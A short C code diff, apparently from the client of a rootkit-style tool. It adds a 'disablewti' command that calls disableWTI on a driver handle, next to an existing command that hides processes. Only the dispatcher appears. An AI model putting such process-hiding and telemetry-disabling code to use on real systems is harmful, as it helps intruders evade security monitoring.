@@ -126,6 +126,10 @@ int main() {
 			}
 			hideProc(hDevice, pid);
 		}
+
+		else if (strncmp(input, "disablewti", 10) == 0) {
+			disableWTI(hDevice);
+		}
 		else if (strncmp(input, "exit", 4) == 0) {
 			exit(0);
 		}
